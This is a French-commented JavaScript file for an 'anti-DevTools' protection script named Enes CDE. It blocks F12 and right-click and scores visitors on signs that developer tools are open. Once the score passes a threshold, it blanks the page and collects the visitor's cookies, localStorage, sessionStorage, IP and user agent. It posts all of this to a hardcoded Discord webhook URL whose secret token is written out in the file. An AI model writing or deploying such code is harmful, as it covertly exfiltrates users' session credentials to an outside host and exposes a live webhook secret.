/*
* Enes CDE - Système de Détection DevTools Avancé
*/
:export function Secure_F12() {
  const isAdmin = () => localStorage.getItem('EnesCDE_ADM:F12') === 'ADMIN';
  if (isAdmin()) {
    console.log('[E-CDE] Admin détecté, détection DevTools désactivée.');
    return;
  }

  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1220142285795098747/TX-3XrNfV_xZxhSpzX8WdJyKcuofwEeqzB5HIgFJ-zTLM-SdcFVGv3s4oXerGmSigoAc';
  const SUSPICION_THRESHOLD_HARD_CHECK = 5; // Points avant le "hard check"
  const SUSPICION_DECREMENT_INTERVAL_MS = 10000; // Décrémente la suspicion toutes les 10 secondes
  const REPORTED_KEY = 'E_CDE_REPORTED';

  let suspicionScore = 0;
  let lastSuspicionIncrementTime = Date.now();

  const encode = s => btoa(unescape(encodeURIComponent(s)));
  const decode = s => decodeURIComponent(escape(atob(s)));

  // --- Fonctions utilitaires (celles que vous avez déjà) ---
  async function collectInfo() {
    let ip = 'unknown';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      ip = (await res.json()).ip;
    } catch (_) {}
    return {
      timestamp: new Date().toISOString(),
      ip,
      userAgent: navigator.userAgent,
      localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage },
      cookies: document.cookie,
    };
  }

  async function reportToDiscord(data) {
    if (localStorage.getItem(REPORTED_KEY) === '1') return;

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: '🚨 Détection DevTools suspecte',
          color: 0xff0000,
          fields: Object.entries(data).map(([k, v]) => ({
            name: k,
            value: typeof v === 'object'
              ? '```json\n' + JSON.stringify(v, null, 2).slice(0, 1000) + '\n```'
              : '```\n' + String(v).slice(0, 1000) + '\n```',
          })),
        }],
      }),
    });

    localStorage.setItem(REPORTED_KEY, '1');
  }

  function showHardCheck() {
    document.body.innerHTML = '';
    const overlay = document.createElement('div');
    overlay.style = `
      position:fixed;top:0;left:0;width:100vw;height:100vh;
      background:black;color:white;font-family:sans-serif;
      display:flex;align-items:center;justify-content:center;flex-direction:column;
      z-index:999999;
    `;
    const title = document.createElement('h1');
    title.innerHTML = 'Enes <span style="color:#00aaff">CDE</span>';
    title.style.marginBottom = '1em';
    const msg = document.createElement('div');
    msg.style = 'background:yellow;color:black;padding:20px;font-size:1.2em;max-width:90%;text-align:left;';
    msg.innerHTML = `
      Utilisateur suspect détecté.<br>
      Rapport envoyé à E‑CDE DB SC.<br>
      Vérification en cours : <span id="step">0</span>/30
    `;
    overlay.append(title, msg);
    document.body.appendChild(overlay);

    let step = 0;
    const interval = setInterval(() => {
      step++;
      overlay.querySelector('#step').textContent = step;
      if (step >= 30) clearInterval(interval);
    }, 500);
    incrementSuspicionPermanent(); // Renommée pour éviter la confusion
  }

  function incrementSuspicionPermanent() { // Anciennement incrementSuspicion
    const key = 'EnesCDe_NOBSUS';
    const banKey = 'ECDE:ID';
    let count = parseInt(localStorage.getItem(key), 10);
    if (isNaN(count)) count = 0;
    count++;
    localStorage.setItem(key, count.toString());
    if (count >= 10) { // Le seuil de ban peut être ajusté
      localStorage.setItem(banKey, 'gn01:e0B:14q:8d80:e5a1:32e2:33ac:adad');
    }
  }

  // --- Nouvelles fonctions de détection et de gestion de la suspicion ---

  function incrementSuspicion(points = 1) {
    suspicionScore += points;
    lastSuspicionIncrementTime = Date.now();
    console.warn(`[E-CDE] Suspicion augmentée à: ${suspicionScore}`);
    if (suspicionScore >= SUSPICION_THRESHOLD_HARD_CHECK) {
      console.warn('[E-CDE] Seuil de suspicion atteint, déclenchement du Hard Check.');
      showHardCheck();
      collectInfo().then(reportToDiscord);
    }
  }

  // Décrémente la suspicion sur le temps si aucune nouvelle détection
  setInterval(() => {
    if (suspicionScore > 0 && (Date.now() - lastSuspicionIncrementTime) > SUSPICION_DECREMENT_INTERVAL_MS) {
      suspicionScore = Math.max(0, suspicionScore - 1); // Décrémente d'un point
      console.log(`[E-CDE] Suspicion décrémentée à: ${suspicionScore}`);
    }
  }, SUSPICION_DECREMENT_INTERVAL_MS);


  // Détection 1: Changement de taille de fenêtre (votre méthode actuelle)
  const THRESHOLD_SIZE_CHANGE = 160;
  setInterval(() => {
    const iw = window.innerWidth, ih = window.innerHeight;
    const ow = window.outerWidth, oh = window.outerHeight;
    const diff = Math.abs(ow - iw) + Math.abs(oh - ih);

    if (diff > THRESHOLD_SIZE_CHANGE) {
      incrementSuspicion(1); // Ajoute 1 point de suspicion pour le changement de taille
    }
  }, 1000); // Peut être un peu plus fréquent pour une réactivité accrue

  // Détection 2: Test de performance de la console (peut indiquer une inspection)
  function detectConsolePerformance() {
    const startTime = performance.now();
    // Exécuter une boucle simple pour simuler une opération légère
    for (let i = 0; i < 1000; i++) { Math.random(); }
    const endTime = performance.now();
    // Si l'exécution est anormalement lente, cela peut indiquer une analyse DevTools
    if ((endTime - startTime) > 50) { // Seuil à ajuster par test
      incrementSuspicion(2); // Ajoute 2 points, car c'est un indicateur plus fort
    }
  }
  // Exécuter cette vérification périodiquement
  setInterval(detectConsolePerformance, 3000);

  // Détection 3: Vérification de la présence de 'debugger' ou de propriétés de 'console'
  // Cette méthode est plus "hardcore" car elle utilise la nature de DevTools
  let devtools = false;
  const threshold = 160; // Votre seuil d'origine pour la taille
  const measure = () => {
    const start = new Date();
    debugger; // Cette ligne mettra le code en pause si les DevTools sont ouverts et configurés pour cela.
    return new Date() - start;
  };

  setInterval(() => {
    const time = measure();
    // Si les DevTools sont ouverts, 'time' sera significativement plus élevé
    // Ou si on tente de les ouvrir, la taille de la fenêtre change
    if (time > 100 || (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold)) {
        if (!devtools) {
            devtools = true;
            incrementSuspicion(3); // Ajoute 3 points, c'est une détection forte
        }
    } else {
        devtools = false;
    }
  }, 500); // Vérification fréquente

  // Empêcher l'ouverture via raccourci F12 (peut être contourné, mais ajoute une couche)
  document.addEventListener('keydown', function(event) {
    if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I') || (event.metaKey && event.altKey && event.key === 'I')) {
      incrementSuspicion(1); // Incrémente la suspicion
      event.preventDefault(); // Empêche l'action par défaut
      console.warn('[E-CDE] Tentative de F12 ou CTRL+SHIFT+I détectée et bloquée.');
    }
  });

  // Empêcher le clic droit pour "Inspecter l'élément" (facilement contournable mais dissuasif)
  document.addEventListener('contextmenu', function(event) {
    // Vous pouvez analyser le point du clic pour être plus spécifique si nécessaire
    // Par exemple, si le clic droit est sur un élément sensible
    incrementSuspicion(0.5); // Moins de points, car c'est une action courante
    event.preventDefault(); // Empêche le menu contextuel
  });

  console.log('[E-CDE] Système de détection DevTools avancé activé.');
}


